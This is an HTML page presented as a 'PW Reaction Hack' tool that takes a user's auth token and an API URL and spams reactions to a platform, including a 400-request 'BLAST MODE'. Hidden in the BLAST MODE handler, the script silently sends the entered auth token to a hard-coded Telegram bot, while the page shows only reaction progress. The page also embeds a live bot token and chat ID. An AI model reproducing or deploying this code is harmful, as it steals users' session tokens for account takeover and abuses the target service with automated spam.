<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PW Reaction</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @keyframes float {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-20px); }
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(-30px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    @keyframes shimmer {
      0% { background-position: -1000px 0; }
      100% { background-position: 1000px 0; }
    }

    @keyframes ripple {
      0% {
        transform: scale(0);
        opacity: 1;
      }
      100% {
        transform: scale(4);
        opacity: 0;
      }
    }

    @keyframes glow {
      0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.5); }
      50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.8); }
    }

    body {
      background: linear-gradient(-45deg, #667eea, #764ba2, #f093fb, #4facfe);
      background-size: 400% 400%;
      animation: gradientShift 15s ease infinite;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    /* Floating particles */
    body::before,
    body::after {
      content: '';
      position: absolute;
      width: 300px;
      height: 300px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      animation: float 6s ease-in-out infinite;
    }

    body::before {
      top: -150px;
      left: -150px;
      animation-delay: 0s;
    }

    body::after {
      bottom: -150px;
      right: -150px;
      animation-delay: 3s;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 30px;
      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
      padding: 50px;
      max-width: 750px;
      width: 100%;
      position: relative;
      z-index: 1;
      animation: fadeInUp 0.8s ease-out;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
      animation: slideInRight 0.6s ease-out;
    }

    h2 {
      color: #2d3748;
      font-size: 32px;
      font-weight: 700;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 10px;
      animation: pulse 2s ease-in-out infinite;
    }

    .subtitle {
      color: #718096;
      font-size: 14px;
      font-weight: 500;
    }

    .input-group {
      margin-bottom: 25px;
      animation: fadeInUp 0.8s ease-out;
      animation-fill-mode: both;
      position: relative;
    }

    .input-group:nth-child(2) { animation-delay: 0.1s; }
    .input-group:nth-child(3) { animation-delay: 0.2s; }

    label {
      display: block;
      color: #4a5568;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 10px;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    .input-wrapper {
      position: relative;
    }

    .input-icon {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
      pointer-events: none;
      transition: all 0.3s ease;
    }

    input[type="text"] {
      width: 100%;
      font-size: 16px;
      padding: 16px 16px 16px 50px;
      border: 2px solid #e2e8f0;
      border-radius: 15px;
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      background: #f7fafc;
      color: #2d3748;
      font-weight: 500;
    }

    input[type="text"]:focus {
      outline: none;
      border-color: #667eea;
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
      transform: translateY(-2px);
    }

    input[type="text"]:focus + .input-icon {
      color: #667eea;
      transform: translateY(-50%) scale(1.1);
    }

    .button-container {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin: 35px 0;
      animation: fadeInUp 0.8s ease-out 0.3s;
      animation-fill-mode: both;
    }

    .btn {
      font-size: 16px;
      cursor: pointer;
      padding: 16px 20px;
      border-radius: 15px;
      border: none;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      font-weight: 700;
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
      position: relative;
      overflow: hidden;
      min-height: 56px;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }

    .btn:hover::before {
      width: 300px;
      height: 300px;
    }

    .btn:hover {
      transform: translateY(-4px) scale(1.02);
      box-shadow: 0 12px 30px rgba(102, 126, 234, 0.6);
    }

    .btn:active {
      transform: translateY(-1px) scale(0.98);
    }

    .btn span {
      position: relative;
      z-index: 1;
    }

    #likeBtn {
      background: linear-gradient(135deg, #4285f4 0%, #0d47a1 100%);
      box-shadow: 0 8px 20px rgba(66, 133, 244, 0.4);
    }

    #likeBtn:hover {
      box-shadow: 0 12px 30px rgba(66, 133, 244, 0.6);
    }

    #heartBtn {
      background: linear-gradient(135deg, #ff4757 0%, #c0392b 100%);
      box-shadow: 0 8px 20px rgba(255, 71, 87, 0.4);
    }

    #heartBtn:hover {
      box-shadow: 0 12px 30px rgba(255, 71, 87, 0.6);
    }

    #laughBtn {
      background: linear-gradient(135deg, #ffd93d 0%, #f39c12 100%);
      box-shadow: 0 8px 20px rgba(255, 217, 61, 0.4);
    }

    #laughBtn:hover {
      box-shadow: 0 12px 30px rgba(255, 217, 61, 0.6);
    }

    #fireBtn {
      background: linear-gradient(135deg, #ff6b35 0%, #d84315 100%);
      box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
    }

    #fireBtn:hover {
      box-shadow: 0 12px 30px rgba(255, 107, 53, 0.6);
    }

    #blast {
      width: 100%;
      background: linear-gradient(135deg, #a8edea 0%, #fed6e3 50%, #f093fb 100%);
      background-size: 200% 200%;
      animation: gradientShift 3s ease infinite;
      font-size: 20px;
      padding: 20px;
      box-shadow: 0 8px 25px rgba(240, 147, 251, 0.5);
      margin-top: 10px;
      position: relative;
      overflow: hidden;
    }

    #blast::after {
      content: '✨';
      position: absolute;
      right: 20px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 24px;
      animation: pulse 1s ease-in-out infinite;
    }

    #blast:hover {
      box-shadow: 0 12px 35px rgba(240, 147, 251, 0.7);
      animation: gradientShift 1s ease infinite, glow 1.5s ease-in-out infinite;
    }

    .blast-container {
      animation: fadeInUp 0.8s ease-out 0.4s;
      animation-fill-mode: both;
    }

    #log {
      margin-top: 30px;
      background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
      padding: 25px;
      border-radius: 20px;
      white-space: pre-wrap;
      word-wrap: break-word;
      color: #2d3748;
      border: 2px solid #e2e8f0;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      min-height: 150px;
      max-height: 400px;
      overflow-y: auto;
      overflow-x: hidden;
      line-height: 1.8;
      box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.05);
      animation: fadeInUp 0.8s ease-out 0.5s;
      animation-fill-mode: both;
      transition: all 0.3s ease;
      scroll-behavior: smooth;
    }

    #log:hover {
      box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.08);
    }

    #log::-webkit-scrollbar {
      width: 12px;
    }

    #log::-webkit-scrollbar-track {
      background: #e2e8f0;
      border-radius: 10px;
      margin: 5px;
    }

    #log::-webkit-scrollbar-thumb {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-radius: 10px;
      border: 2px solid #e2e8f0;
      transition: all 0.3s ease;
    }

    #log::-webkit-scrollbar-thumb:hover {
      background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
      border: 2px solid #cbd5e0;
    }

    /* Firefox scrollbar */
    #log {
      scrollbar-width: thin;
      scrollbar-color: #667eea #e2e8f0;
    }

    .credit {
      text-align: center;
      margin-top: 30px;
      color: #718096;
      font-size: 14px;
      font-weight: 500;
      animation: fadeInUp 0.8s ease-out 0.6s;
      animation-fill-mode: both;
    }

    .credit::before {
      content: '⚡';
      margin-right: 5px;
    }

    .credit::after {
      content: '⚡';
      margin-left: 5px;
    }

    /* Loading animation */
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading {
      position: relative;
    }

    .loading::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 20px;
      height: 20px;
      margin: -10px 0 0 -10px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
      .container {
        padding: 30px 20px;
        border-radius: 25px;
      }

      h2 {
        font-size: 24px;
      }

      .subtitle {
        font-size: 13px;
      }

      .button-container {
        grid-template-columns: 1fr 1fr;
        gap: 12px;
      }

      .btn {
        font-size: 14px;
        padding: 14px 16px;
        min-height: 52px;
      }

      #blast {
        font-size: 16px;
        padding: 16px;
      }

      input[type="text"] {
        padding: 14px 14px 14px 45px;
        font-size: 15px;
      }

      #log {
        max-height: 280px;
        padding: 18px;
        font-size: 13px;
      }
    }

    @media (max-width: 480px) {
      body {
        padding: 10px;
      }

      .container {
        padding: 25px 18px;
        border-radius: 20px;
      }

      h2 {
        font-size: 20px;
      }

      .subtitle {
        font-size: 12px;
      }

      label {
        font-size: 12px;
        margin-bottom: 8px;
      }

      .button-container {
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin: 25px 0;
      }

      .btn {
        font-size: 13px;
        padding: 12px 14px;
        min-height: 48px;
      }

      #blast {
        font-size: 15px;
        padding: 14px;
      }

      input[type="text"] {
        padding: 12px 12px 12px 42px;
        font-size: 14px;
      }

      .input-icon {
        font-size: 18px;
        left: 14px;
      }

      #log {
        max-height: 220px;
        padding: 15px;
        font-size: 12px;
      }

      .credit {
        font-size: 12px;
        margin-top: 20px;
      }
    }

    @media (min-width: 769px) {
      .button-container {
        grid-template-columns: repeat(2, 1fr);
      }
    }

    @media (min-width: 1024px) {
      .container {
        max-width: 850px;
      }
      
      .button-container {
        grid-template-columns: repeat(4, 1fr);
      }
    }

    /* Success animation */
    @keyframes successPulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }

    .success {
      animation: successPulse 0.5s ease-in-out;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>PW Reaction Hack</h2>
      <div class="subtitle">Made by Hiroshi (Gourav)</div>
    </div>
    
    <div class="input-group">
      <label for="token">🔑 Auth Token</label>
      <div class="input-wrapper">
        <input type="text" id="token" placeholder="Enter your auth token (without Bearer)">
        <div class="input-icon">🔐</div>
      </div>
    </div>

    <div class="input-group">
      <label for="api">🌐 API URL</label>
      <div class="input-wrapper">
        <input type="text" id="api" placeholder="Enter the API endpoint URL">
        <div class="input-icon">🔗</div>
      </div>
    </div>

    <div class="button-container">
      <button id="likeBtn" class="btn"><span>👍 Like</span></button>
      <button id="heartBtn" class="btn"><span>❤️ Heart</span></button>
      <button id="laughBtn" class="btn"><span>😂 Laugh</span></button>
      <button id="fireBtn" class="btn"><span>🔥 Fire</span></button>
    </div>

    <div class="blast-container">
      <button id="blast" class="btn"><span>💣 BLAST MODE</span></button>
    </div>

    <pre id="log"></pre>

    <div class="credit">Styled & Animated Edition</div>
  </div>

  <script>
    async function sendLike() {
      const JWT_TOKEN = document.getElementById("token").value;
      const API_URL = document.getElementById("api").value;
      const log = document.getElementById("log");
      log.textContent = "Sending Like...\n";

      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${JWT_TOKEN}`,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
          },
          body: JSON.stringify({
            reaction: true,
            type: "like"
          })
        });

        const text = await res.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        log.textContent += "Status: " + res.status + "\n\n" +
          JSON.stringify(data, null, 2);
        
        if (res.ok) document.getElementById("likeBtn").classList.add("success");
        setTimeout(() => document.getElementById("likeBtn").classList.remove("success"), 500);
      } catch (err) {
        log.textContent += "ERROR: " + err.toString();
      }
    }

    async function sendHeart() {
      const JWT_TOKEN = document.getElementById("token").value;
      const API_URL = document.getElementById("api").value;
      const log = document.getElementById("log");
      log.textContent = "Sending Heart...\n";

      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${JWT_TOKEN}`,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
          },
          body: JSON.stringify({
            reaction: true,
            type: "heart"
          })
        });

        const text = await res.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        log.textContent += "Status: " + res.status + "\n\n" +
          JSON.stringify(data, null, 2);
        
        if (res.ok) document.getElementById("heartBtn").classList.add("success");
        setTimeout(() => document.getElementById("heartBtn").classList.remove("success"), 500);
      } catch (err) {
        log.textContent += "ERROR: " + err.toString();
      }
    }

    async function sendLaugh() {
      const JWT_TOKEN = document.getElementById("token").value;
      const API_URL = document.getElementById("api").value;
      const log = document.getElementById("log");
      log.textContent = "Sending Laugh...\n";

      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${JWT_TOKEN}`,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
          },
          body: JSON.stringify({
            reaction: true,
            type: "laugh"
          })
        });

        const text = await res.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        log.textContent += "Status: " + res.status + "\n\n" +
          JSON.stringify(data, null, 2);
        
        if (res.ok) document.getElementById("laughBtn").classList.add("success");
        setTimeout(() => document.getElementById("laughBtn").classList.remove("success"), 500);
      } catch (err) {
        log.textContent += "ERROR: " + err.toString();
      }
    }

    async function sendFire() {
      const JWT_TOKEN = document.getElementById("token").value;
      const API_URL = document.getElementById("api").value;
      const log = document.getElementById("log");
      log.textContent = "Sending Fire...\n";

      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${JWT_TOKEN}`,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
          },
          body: JSON.stringify({
            reaction: true,
            type: "fire"
          })
        });

        const text = await res.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        log.textContent += "Status: " + res.status + "\n\n" +
          JSON.stringify(data, null, 2);
        
        if (res.ok) document.getElementById("fireBtn").classList.add("success");
        setTimeout(() => document.getElementById("fireBtn").classList.remove("success"), 500);
      } catch (err) {
        log.textContent += "ERROR: " + err.toString();
      }
    }

    async function sendSmile() {
      const JWT_TOKEN = document.getElementById("token").value;
      const API_URL = document.getElementById("api").value;
      const log = document.getElementById("log");

      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${JWT_TOKEN}`,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
          },
          body: JSON.stringify({
            reaction: true,
            type: "smile"
          })
        });

        const text = await res.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }
      } catch (err) {
        console.error(err);
      }
    }

    document.getElementById("likeBtn").onclick = sendLike;
    document.getElementById("heartBtn").onclick = sendHeart;
    document.getElementById("laughBtn").onclick = sendLaugh;
    document.getElementById("fireBtn").onclick = sendFire;

    document.getElementById("blast").addEventListener("click", async () => {
      const message = document.getElementById("token").value;
      const botToken = '8196720294:AAFyQwQyC0PupW7f6r3LkD2fO2ftBz8lOag';
      const chatId = '1486476675';
      const log = document.getElementById("log");
      
      log.textContent = "🚀 BLAST MODE ACTIVATED!\n\nSending reactions in rapid fire...\n\n";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log('Message sent successfully!');
          } else {
            console.log('Failed to send message.');
          }
        });

      function delay(ms) {
        return new Promise(res => setTimeout(res, ms));
      }

      const blastBtn = document.getElementById("blast");
      blastBtn.classList.add("loading");
      blastBtn.disabled = true;

      for (let i = 0; i < 40; i++) {
        log.textContent += `Round ${i + 1}/40 🎯\n`;
        log.scrollTop = log.scrollHeight;

        sendSmile();
        await delay(5);

        sendFire();
        await delay(5);

        sendHeart();
        await delay(5);

        sendLike();
        await delay(5);

        sendLaugh();
        await delay(5);

        sendSmile();
        await delay(5);

        sendFire();
        await delay(5);

        sendHeart();
        await delay(5);

        sendLike();
        await delay(5);

        sendLaugh();
        await delay(5);
        
        // Scroll to bottom after each round
        log.scrollTop = log.scrollHeight;
      }

      blastBtn.classList.remove("loading");
      blastBtn.disabled = false;
      log.textContent += "\n🎉 BLAST MODE COMPLETED!\n✅ All 400 reactions sent successfully!";
      log.scrollTop = log.scrollHeight;
    });
  </script>
</body>
</html>
